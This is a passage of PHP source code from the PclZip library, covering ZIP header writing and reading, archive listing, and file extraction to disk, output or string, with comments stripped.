    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($v_file_compressed, $v_read_size);
    @fwrite($this->zip_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  @fclose($v_file_compressed);

  @unlink($v_gzip_temp_name);
  
  return $v_result;
}

function privCalculateStoredFilename(&$p_filedescr, &$p_options)
{
  $v_result=1;
  
  $p_filename = $p_filedescr['filename'];
  if (isset($p_options[PCLZIP_OPT_ADD_PATH])) {
    $p_add_dir = $p_options[PCLZIP_OPT_ADD_PATH];
  }
  else {
    $p_add_dir = '';
  }
  if (isset($p_options[PCLZIP_OPT_REMOVE_PATH])) {
    $p_remove_dir = $p_options[PCLZIP_OPT_REMOVE_PATH];
  }
  else {
    $p_remove_dir = '';
  }
  if (isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
    $p_remove_all_dir = $p_options[PCLZIP_OPT_REMOVE_ALL_PATH];
  }
  else {
    $p_remove_all_dir = 0;
  }


  if (isset($p_filedescr['new_full_name'])) {
    $v_stored_filename = PclZipUtilTranslateWinPath($p_filedescr['new_full_name']);
  }
  
  else {

    if (isset($p_filedescr['new_short_name'])) {
      $v_path_info = pathinfo($p_filename);
      $v_dir = '';
      if ($v_path_info['dirname'] != '') {
        $v_dir = $v_path_info['dirname'].'/';
      }
      $v_stored_filename = $v_dir.$p_filedescr['new_short_name'];
    }
    else {
      $v_stored_filename = $p_filename;
    }

    if ($p_remove_all_dir) {
      $v_stored_filename = basename($p_filename);
    }
    else if ($p_remove_dir != "") {
      if (substr($p_remove_dir, -1) != '/')
        $p_remove_dir .= "/";

      if (   (substr($p_filename, 0, 2) == "./")
          || (substr($p_remove_dir, 0, 2) == "./")) {
          
        if (   (substr($p_filename, 0, 2) == "./")
            && (substr($p_remove_dir, 0, 2) != "./")) {
          $p_remove_dir = "./".$p_remove_dir;
        }
        if (   (substr($p_filename, 0, 2) != "./")
            && (substr($p_remove_dir, 0, 2) == "./")) {
          $p_remove_dir = substr($p_remove_dir, 2);
        }
      }

      $v_compare = PclZipUtilPathInclusion($p_remove_dir,
                                           $v_stored_filename);
      if ($v_compare > 0) {
        if ($v_compare == 2) {
          $v_stored_filename = "";
        }
        else {
          $v_stored_filename = substr($v_stored_filename,
                                      strlen($p_remove_dir));
        }
      }
    }
    
    $v_stored_filename = PclZipUtilTranslateWinPath($v_stored_filename);
    
    if ($p_add_dir != "") {
      if (substr($p_add_dir, -1) == "/")
        $v_stored_filename = $p_add_dir.$v_stored_filename;
      else
        $v_stored_filename = $p_add_dir."/".$v_stored_filename;
    }
  }

  $v_stored_filename = PclZipUtilPathReduction($v_stored_filename);
  $p_filedescr['stored_filename'] = $v_stored_filename;
  
  return $v_result;
}

function privWriteFileHeader(&$p_header)
{
  $v_result=1;

  $p_header['offset'] = ftell($this->zip_fd);

  $v_date = getdate($p_header['mtime']);
  $v_mtime = ($v_date['hours']<<11) + ($v_date['minutes']<<5) + $v_date['seconds']/2;
  $v_mdate = (($v_date['year']-1980)<<9) + ($v_date['mon']<<5) + $v_date['mday'];

  $v_binary_data = pack("VvvvvvVVVvv", 0x04034b50,
                      $p_header['version_extracted'], $p_header['flag'],
                        $p_header['compression'], $v_mtime, $v_mdate,
                        $p_header['crc'], $p_header['compressed_size'],
					  $p_header['size'],
                        strlen($p_header['stored_filename']),
					  $p_header['extra_len']);

  fputs($this->zip_fd, $v_binary_data, 30);

  if (strlen($p_header['stored_filename']) != 0)
  {
    fputs($this->zip_fd, $p_header['stored_filename'], strlen($p_header['stored_filename']));
  }
  if ($p_header['extra_len'] != 0)
  {
    fputs($this->zip_fd, $p_header['extra'], $p_header['extra_len']);
  }

  return $v_result;
}

function privWriteCentralFileHeader(&$p_header)
{
  $v_result=1;

  $v_date = getdate($p_header['mtime']);
  $v_mtime = ($v_date['hours']<<11) + ($v_date['minutes']<<5) + $v_date['seconds']/2;
  $v_mdate = (($v_date['year']-1980)<<9) + ($v_date['mon']<<5) + $v_date['mday'];


  $v_binary_data = pack("VvvvvvvVVVvvvvvVV", 0x02014b50,
                      $p_header['version'], $p_header['version_extracted'],
                        $p_header['flag'], $p_header['compression'],
					  $v_mtime, $v_mdate, $p_header['crc'],
                        $p_header['compressed_size'], $p_header['size'],
                        strlen($p_header['stored_filename']),
					  $p_header['extra_len'], $p_header['comment_len'],
                        $p_header['disk'], $p_header['internal'],
					  $p_header['external'], $p_header['offset']);

  fputs($this->zip_fd, $v_binary_data, 46);

  if (strlen($p_header['stored_filename']) != 0)
  {
    fputs($this->zip_fd, $p_header['stored_filename'], strlen($p_header['stored_filename']));
  }
  if ($p_header['extra_len'] != 0)
  {
    fputs($this->zip_fd, $p_header['extra'], $p_header['extra_len']);
  }
  if ($p_header['comment_len'] != 0)
  {
    fputs($this->zip_fd, $p_header['comment'], $p_header['comment_len']);
  }

  return $v_result;
}

function privWriteCentralHeader($p_nb_entries, $p_size, $p_offset, $p_comment)
{
  $v_result=1;

  $v_binary_data = pack("VvvvvVVv", 0x06054b50, 0, 0, $p_nb_entries,
                      $p_nb_entries, $p_size,
					  $p_offset, strlen($p_comment));

  fputs($this->zip_fd, $v_binary_data, 22);

  if (strlen($p_comment) != 0)
  {
    fputs($this->zip_fd, $p_comment, strlen($p_comment));
  }

  return $v_result;
}

function privList(&$p_list)
{
  $v_result=1;

  $this->privDisableMagicQuotes();

  if (($this->zip_fd = @fopen($this->zipname, 'rb')) == 0)
  {
    $this->privSwapBackMagicQuotes();
    
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in binary read mode');

    return PclZip::errorCode();
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }

  @rewind($this->zip_fd);
  if (@fseek($this->zip_fd, $v_central_dir['offset']))
  {
    $this->privSwapBackMagicQuotes();

    PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

    return PclZip::errorCode();
  }

  for ($i=0; $i<$v_central_dir['entries']; $i++)
  {
    if (($v_result = $this->privReadCentralFileHeader($v_header)) != 1)
    {
      $this->privSwapBackMagicQuotes();
      return $v_result;
    }
    $v_header['index'] = $i;

    $this->privConvertHeader2FileInfo($v_header, $p_list[$i]);
    unset($v_header);
  }

  $this->privCloseFd();

  $this->privSwapBackMagicQuotes();

  return $v_result;
}

function privConvertHeader2FileInfo($p_header, &$p_info)
{
  $v_result=1;

  $v_temp_path = PclZipUtilPathReduction($p_header['filename']);
  $p_info['filename'] = $v_temp_path;
  $v_temp_path = PclZipUtilPathReduction($p_header['stored_filename']);
  $p_info['stored_filename'] = $v_temp_path;
  $p_info['size'] = $p_header['size'];
  $p_info['compressed_size'] = $p_header['compressed_size'];
  $p_info['mtime'] = $p_header['mtime'];
  $p_info['comment'] = $p_header['comment'];
  $p_info['folder'] = (($p_header['external']&0x00000010)==0x00000010);
  $p_info['index'] = $p_header['index'];
  $p_info['status'] = $p_header['status'];
  $p_info['crc'] = $p_header['crc'];

  return $v_result;
}

function privExtractByRule(&$p_file_list, $p_path, $p_remove_path, $p_remove_all_path, &$p_options)
{
  $v_result=1;

  $this->privDisableMagicQuotes();

  if (   ($p_path == "")
    || (   (substr($p_path, 0, 1) != "/")
	    && (substr($p_path, 0, 3) != "../")
		&& (substr($p_path,1,2)!=":/")))
    $p_path = "./".$p_path;

  if (($p_path != "./") && ($p_path != "/"))
  {
    while (substr($p_path, -1) == "/")
    {
      $p_path = substr($p_path, 0, strlen($p_path)-1);
    }
  }

  if (($p_remove_path != "") && (substr($p_remove_path, -1) != '/'))
  {
    $p_remove_path .= '/';
  }
  $p_remove_path_size = strlen($p_remove_path);

  if (($v_result = $this->privOpenFd('rb')) != 1)
  {
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_pos_entry = $v_central_dir['offset'];

  $j_start = 0;
  for ($i=0, $v_nb_extracted=0; $i<$v_central_dir['entries']; $i++)
  {

    @rewind($this->zip_fd);
    if (@fseek($this->zip_fd, $v_pos_entry))
    {
      $this->privCloseFd();
      $this->privSwapBackMagicQuotes();

      PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

      return PclZip::errorCode();
    }

    $v_header = array();
    if (($v_result = $this->privReadCentralFileHeader($v_header)) != 1)
    {
      $this->privCloseFd();
      $this->privSwapBackMagicQuotes();

      return $v_result;
    }

    $v_header['index'] = $i;

    $v_pos_entry = ftell($this->zip_fd);

    $v_extract = false;

    if (   (isset($p_options[PCLZIP_OPT_BY_NAME]))
        && ($p_options[PCLZIP_OPT_BY_NAME] != 0)) {

        for ($j=0; ($j<sizeof($p_options[PCLZIP_OPT_BY_NAME])) && (!$v_extract); $j++) {

            if (substr($p_options[PCLZIP_OPT_BY_NAME][$j], -1) == "/") {

                if (   (strlen($v_header['stored_filename']) > strlen($p_options[PCLZIP_OPT_BY_NAME][$j]))
                    && (substr($v_header['stored_filename'], 0, strlen($p_options[PCLZIP_OPT_BY_NAME][$j])) == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                    $v_extract = true;
                }
            }
            elseif ($v_header['stored_filename'] == $p_options[PCLZIP_OPT_BY_NAME][$j]) {
                $v_extract = true;
            }
        }
    }


    else if (   (isset($p_options[PCLZIP_OPT_BY_PREG]))
             && ($p_options[PCLZIP_OPT_BY_PREG] != "")) {

        if (preg_match($p_options[PCLZIP_OPT_BY_PREG], $v_header['stored_filename'])) {
            $v_extract = true;
        }
    }

    else if (   (isset($p_options[PCLZIP_OPT_BY_INDEX]))
             && ($p_options[PCLZIP_OPT_BY_INDEX] != 0)) {
        
        for ($j=$j_start; ($j<sizeof($p_options[PCLZIP_OPT_BY_INDEX])) && (!$v_extract); $j++) {

            if (($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['start']) && ($i<=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end'])) {
                $v_extract = true;
            }
            if ($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end']) {
                $j_start = $j+1;
            }

            if ($p_options[PCLZIP_OPT_BY_INDEX][$j]['start']>$i) {
                break;
            }
        }
    }

    else {
        $v_extract = true;
    }

  if (   ($v_extract)
      && (   ($v_header['compression'] != 8)
	      && ($v_header['compression'] != 0))) {
        $v_header['status'] = 'unsupported_compression';

        if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	      && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

            $this->privSwapBackMagicQuotes();
            
            PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_COMPRESSION,
		                       "Filename '".$v_header['stored_filename']."' is "
			  	    	  	   ."compressed by an unsupported compression "
			  	    	  	   ."method (".$v_header['compression'].") ");

            return PclZip::errorCode();
	  }
  }
  
  if (($v_extract) && (($v_header['flag'] & 1) == 1)) {
        $v_header['status'] = 'unsupported_encryption';

        if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	      && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

            $this->privSwapBackMagicQuotes();

            PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_ENCRYPTION,
		                       "Unsupported encryption for "
			  	    	  	   ." filename '".$v_header['stored_filename']
							   ."'");

            return PclZip::errorCode();
	  }
  }

    if (($v_extract) && ($v_header['status'] != 'ok')) {
        $v_result = $this->privConvertHeader2FileInfo($v_header,
	                                        $p_file_list[$v_nb_extracted++]);
        if ($v_result != 1) {
            $this->privCloseFd();
            $this->privSwapBackMagicQuotes();
            return $v_result;
        }

        $v_extract = false;
    }
    
    if ($v_extract)
    {

      @rewind($this->zip_fd);
      if (@fseek($this->zip_fd, $v_header['offset']))
      {
        $this->privCloseFd();

        $this->privSwapBackMagicQuotes();

        PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

        return PclZip::errorCode();
      }

      if ($p_options[PCLZIP_OPT_EXTRACT_AS_STRING]) {

        $v_string = '';

        $v_result1 = $this->privExtractFileAsString($v_header, $v_string, $p_options);
        if ($v_result1 < 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result1;
        }

        if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted])) != 1)
        {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();

          return $v_result;
        }

        $p_file_list[$v_nb_extracted]['content'] = $v_string;

        $v_nb_extracted++;
        
        if ($v_result1 == 2) {
        	break;
        }
      }
      elseif (   (isset($p_options[PCLZIP_OPT_EXTRACT_IN_OUTPUT]))
	        && ($p_options[PCLZIP_OPT_EXTRACT_IN_OUTPUT])) {
        $v_result1 = $this->privExtractFileInOutput($v_header, $p_options);
        if ($v_result1 < 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result1;
        }

        if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted++])) != 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result;
        }

        if ($v_result1 == 2) {
        	break;
        }
      }
      else {
        $v_result1 = $this->privExtractFile($v_header,
	                                      $p_path, $p_remove_path,
										  $p_remove_all_path,
										  $p_options);
        if ($v_result1 < 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result1;
        }

        if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted++])) != 1)
        {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();

          return $v_result;
        }

        if ($v_result1 == 2) {
        	break;
        }
      }
    }
  }

  $this->privCloseFd();
  $this->privSwapBackMagicQuotes();

  return $v_result;
}

function privExtractFile(&$p_entry, $p_path, $p_remove_path, $p_remove_all_path, &$p_options)
{
  $v_result=1;

  if (($v_result = $this->privReadFileHeader($v_header)) != 1)
  {
    return $v_result;
  }


  if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
  }

  if ($p_remove_all_path == true) {
      if (($p_entry['external']&0x00000010)==0x00000010) {

          $p_entry['status'] = "filtered";

          return $v_result;
      }

      $p_entry['filename'] = basename($p_entry['filename']);
  }

  else if ($p_remove_path != "")
  {
    if (PclZipUtilPathInclusion($p_remove_path, $p_entry['filename']) == 2)
    {

      $p_entry['status'] = "filtered";

      return $v_result;
    }

    $p_remove_path_size = strlen($p_remove_path);
    if (substr($p_entry['filename'], 0, $p_remove_path_size) == $p_remove_path)
    {

      $p_entry['filename'] = substr($p_entry['filename'], $p_remove_path_size);

    }
  }

  if ($p_path != '') {
    $p_entry['filename'] = $p_path."/".$p_entry['filename'];
  }
  
  if (isset($p_options[PCLZIP_OPT_EXTRACT_DIR_RESTRICTION])) {
    $v_inclusion
    = PclZipUtilPathInclusion($p_options[PCLZIP_OPT_EXTRACT_DIR_RESTRICTION],
                              $p_entry['filename']); 
    if ($v_inclusion == 0) {

      PclZip::privErrorLog(PCLZIP_ERR_DIRECTORY_RESTRICTION,
		                     "Filename '".$p_entry['filename']."' is "
							 ."outside PCLZIP_OPT_EXTRACT_DIR_RESTRICTION");

      return PclZip::errorCode();
    }
  }

  if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);
    if ($v_result == 0) {
      $p_entry['status'] = "skipped";
      $v_result = 1;
    }
    
    if ($v_result == 2) {
      $p_entry['status'] = "aborted";
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }

    $p_entry['filename'] = $v_local_header['filename'];
  }


  if ($p_entry['status'] == 'ok') {

  if (file_exists($p_entry['filename']))
  {

    if (is_dir($p_entry['filename']))
    {

      $p_entry['status'] = "already_a_directory";
      
      if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	    && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

          PclZip::privErrorLog(PCLZIP_ERR_ALREADY_A_DIRECTORY,
		                     "Filename '".$p_entry['filename']."' is "
							 ."already used by an existing directory");

          return PclZip::errorCode();
	    }
    }
    else if (!is_writeable($p_entry['filename']))
    {

      $p_entry['status'] = "write_protected";

      if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	    && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

          PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL,
		                     "Filename '".$p_entry['filename']."' exists "
							 ."and is write protected");

          return PclZip::errorCode();
	    }
    }

    else if (filemtime($p_entry['filename']) > $p_entry['mtime'])
    {
      if (   (isset($p_options[PCLZIP_OPT_REPLACE_NEWER]))
	    && ($p_options[PCLZIP_OPT_REPLACE_NEWER]===true)) {
  	  }
	    else {
          $p_entry['status'] = "newer_exist";

          if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	        && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

              PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL,
		             "Newer version of '".$p_entry['filename']."' exists "
				    ."and option PCLZIP_OPT_REPLACE_NEWER is not selected");

              return PclZip::errorCode();
	      }
	    }
    }
    else {
    }
  }

  else {
    if ((($p_entry['external']&0x00000010)==0x00000010) || (substr($p_entry['filename'], -1) == '/'))
      $v_dir_to_check = $p_entry['filename'];
    else if (!strstr($p_entry['filename'], "/"))
      $v_dir_to_check = "";
    else
      $v_dir_to_check = dirname($p_entry['filename']);

      if (($v_result = $this->privDirCheck($v_dir_to_check, (($p_entry['external']&0x00000010)==0x00000010))) != 1) {

        $p_entry['status'] = "path_creation_fail";

        $v_result = 1;
      }
    }
  }

  if ($p_entry['status'] == 'ok') {

    if (!(($p_entry['external']&0x00000010)==0x00000010))
    {
      if ($p_entry['compression'] == 0) {

        if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0)
        {

          $p_entry['status'] = "write_error";

          return $v_result;
        }


        $v_size = $p_entry['compressed_size'];
        while ($v_size != 0)
        {
          $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
          $v_buffer = @fread($this->zip_fd, $v_read_size);
          @fwrite($v_dest_file, $v_buffer, $v_read_size);            
          $v_size -= $v_read_size;
        }

        fclose($v_dest_file);

        touch($p_entry['filename'], $p_entry['mtime']);
        

      }
      else {
        if (($p_entry['flag'] & 1) == 1) {
          PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_ENCRYPTION, 'File \''.$p_entry['filename'].'\' is encrypted. Encrypted files are not supported.');
          return PclZip::errorCode();
        }


        if ( (!isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) 
            && (isset($p_options[PCLZIP_OPT_TEMP_FILE_ON])
                || (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD])
                    && ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] <= $p_entry['size'])) ) ) {
          $v_result = $this->privExtractFileUsingTempFile($p_entry, $p_options);
          if ($v_result < PCLZIP_ERR_NO_ERROR) {
            return $v_result;
          }
        }
        
        else {

        
          $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);
          
          $v_file_content = @gzinflate($v_buffer);
          unset($v_buffer);
          if ($v_file_content === FALSE) {

            $p_entry['status'] = "error";
            
            return $v_result;
          }
          
          if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0) {

            $p_entry['status'] = "write_error";

            return $v_result;
          }

          @fwrite($v_dest_file, $v_file_content, $p_entry['size']);
          unset($v_file_content);

          @fclose($v_dest_file);
          
        }

        @touch($p_entry['filename'], $p_entry['mtime']);
      }

      if (isset($p_options[PCLZIP_OPT_SET_CHMOD])) {

        @chmod($p_entry['filename'], $p_options[PCLZIP_OPT_SET_CHMOD]);
      }

    }
  }

	if ($p_entry['status'] == "aborted") {
      $p_entry['status'] = "skipped";
	}

  elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);

    if ($v_result == 2) {
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }
  }

  return $v_result;
}

function privExtractFileUsingTempFile(&$p_entry, &$p_options)
{
  $v_result=1;
      
  $v_gzip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.gz';
  if (($v_dest_file = @fopen($v_gzip_temp_name, "wb")) == 0) {
    fclose($v_file);
    PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary write mode');
    return PclZip::errorCode();
  }


  $v_binary_data = pack('va1a1Va1a1', 0x8b1f, Chr($p_entry['compression']), Chr(0x00), time(), Chr(0x00), Chr(3));
  @fwrite($v_dest_file, $v_binary_data, 10);

  $v_size = $p_entry['compressed_size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($this->zip_fd, $v_read_size);
    @fwrite($v_dest_file, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_binary_data = pack('VV', $p_entry['crc'], $p_entry['size']);
  @fwrite($v_dest_file, $v_binary_data, 8);

  @fclose($v_dest_file);

  if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0) {
    $p_entry['status'] = "write_error";
    return $v_result;
  }

  if (($v_src_file = @gzopen($v_gzip_temp_name, 'rb')) == 0) {
    @fclose($v_dest_file);
    $p_entry['status'] = "read_error";
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
    return PclZip::errorCode();
  }


  $v_size = $p_entry['size'];
  while ($v_size != 0) {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @gzread($v_src_file, $v_read_size);
    @fwrite($v_dest_file, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }
  @fclose($v_dest_file);
  @gzclose($v_src_file);

  @unlink($v_gzip_temp_name);
  
  return $v_result;
}

function privExtractFileInOutput(&$p_entry, &$p_options)
{
  $v_result=1;

  if (($v_result = $this->privReadFileHeader($v_header)) != 1) {
    return $v_result;
  }


  if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
  }

  if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);
    if ($v_result == 0) {
      $p_entry['status'] = "skipped";
      $v_result = 1;
    }

    if ($v_result == 2) {
      $p_entry['status'] = "aborted";
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }

    $p_entry['filename'] = $v_local_header['filename'];
  }


  if ($p_entry['status'] == 'ok') {

    if (!(($p_entry['external']&0x00000010)==0x00000010)) {
      if ($p_entry['compressed_size'] == $p_entry['size']) {

        $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);

        echo $v_buffer;
        unset($v_buffer);
      }
      else {

        $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);
        
        $v_file_content = gzinflate($v_buffer);
        unset($v_buffer);

        echo $v_file_content;
        unset($v_file_content);
      }
    }
  }

if ($p_entry['status'] == "aborted") {
    $p_entry['status'] = "skipped";
}

  elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);

    if ($v_result == 2) {
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }
  }

  return $v_result;
}

function privExtractFileAsString(&$p_entry, &$p_string, &$p_options)
{
  $v_result=1;

  $v_header = array();
  if (($v_result = $this->privReadFileHeader($v_header)) != 1)
  {
    return $v_result;
  }


  if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
  }

  if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);
    if ($v_result == 0) {
      $p_entry['status'] = "skipped";
      $v_result = 1;
    }
    
    if ($v_result == 2) {
      $p_entry['status'] = "aborted";
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }

    $p_entry['filename'] = $v_local_header['filename'];
  }


  if ($p_entry['status'] == 'ok') {

    if (!(($p_entry['external']&0x00000010)==0x00000010)) {
      if ($p_entry['compression'] == 0) {

        $p_string = @fread($this->zip_fd, $p_entry['compressed_size']);
      }
      else {

        $v_data = @fread($this->zip_fd, $p_entry['compressed_size']);
        
        if (($p_string = @gzinflate($v_data)) === FALSE) {
        }
      }

    }
    else {
    }
    
  }

	if ($p_entry['status'] == "aborted") {
      $p_entry['status'] = "skipped";
	}

  elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);
    
    $v_local_header['content'] = $p_string;
    $p_string = '';

    $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);

    $p_string = $v_local_header['content'];
    unset($v_local_header['content']);

    if ($v_result == 2) {
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }
  }

  return $v_result;
}

function privReadFileHeader(&$p_header)
{
  $v_result=1;

  $v_binary_data = @fread($this->zip_fd, 4);
  $v_data = unpack('Vid', $v_binary_data);

  if ($v_data['id'] != 0x04034b50)
  {

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Invalid archive structure');

    return PclZip::errorCode();
  }

  $v_binary_data = fread($this->zip_fd, 26);

  if (strlen($v_binary_data) != 26)
  {
    $p_header['filename'] = "";
    $p_header['status'] = "invalid_header";

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid block size : ".strlen($v_binary_data));

    return PclZip::errorCode();
  }

  $v_data = unpack('vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $v_binary_data);

  $p_header['filename'] = fread($this->zip_fd, $v_data['filename_len']);

  if ($v_data['extra_len'] != 0) {
    $p_header['extra'] = fread($this->zip_fd, $v_data['extra_len']);
  }
  else {
    $p_header['extra'] = '';
  }

  $p_header['version_extracted'] = $v_data['version'];
  $p_header['compression'] = $v_data['compression'];
  $p_header['size'] = $v_data['size'];
  $p_header['compressed_size'] = $v_data['compressed_size'];
  $p_header['crc'] = $v_data['crc'];
  $p_header['flag'] = $v_data['flag'];
  $p_header['filename_len'] = $v_data['filename_len'];

  $p_header['mdate'] = $v_data['mdate'];
  $p_header['mtime'] = $v_data['mtime'];
  if ($p_header['mdate'] && $p_header['mtime'])
  {
    $v_hour = ($p_header['mtime'] & 0xF800) >> 11;
    $v_minute = ($p_header['mtime'] & 0x07E0) >> 5;
    $v_seconde = ($p_header['mtime'] & 0x001F)*2;

    $v_year = (($p_header['mdate'] & 0xFE00) >> 9) + 1980;
    $v_month = ($p_header['mdate'] & 0x01E0) >> 5;
    $v_day = $p_header['mdate'] & 0x001F;

    $p_header['mtime'] = @mktime($v_hour, $v_minute, $v_seconde, $v_month, $v_day, $v_year);

  }
  else
  {
    $p_header['mtime'] = time();
  }


  $p_header['stored_filename'] = $p_header['filename'];

  $p_header['status'] = "ok";

  return $v_result;
}

function privReadCentralFileHeader(&$p_header)
{
  $v_result=1;

  $v_binary_data = @fread($this->zip_fd, 4);
  $v_data = unpack('Vid', $v_binary_data);

  if ($v_data['id'] != 0x02014b50)
  {

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Invalid archive structure');

    return PclZip::errorCode();
  }

  $v_binary_data = fread($this->zip_fd, 42);

  if (strlen($v_binary_data) != 42)
  {
    $p_header['filename'] = "";
    $p_header['status'] = "invalid_header";

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid block size : ".strlen($v_binary_data));

    return PclZip::errorCode();
  }

  $p_header = unpack('vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $v_binary_data);

  if ($p_header['filename_len'] != 0)
    $p_header['filename'] = fread($this->zip_fd, $p_header['filename_len']);
  else
    $p_header['filename'] = '';

  if ($p_header['extra_len'] != 0)
    $p_header['extra'] = fread($this->zip_fd, $p_header['extra_len']);
  else
    $p_header['extra'] = '';

  if ($p_header['comment_len'] != 0)
    $p_header['comment'] = fread($this->zip_fd, $p_header['comment_len']);
  else
    $p_header['comment'] = '';

  if (1)
  {
    $v_hour = ($p_header['mtime'] & 0xF800) >> 11;
    $v_minute = ($p_header['mtime'] & 0x07E0) >> 5;
    $v_seconde = ($p_header['mtime'] & 0x001F)*2;

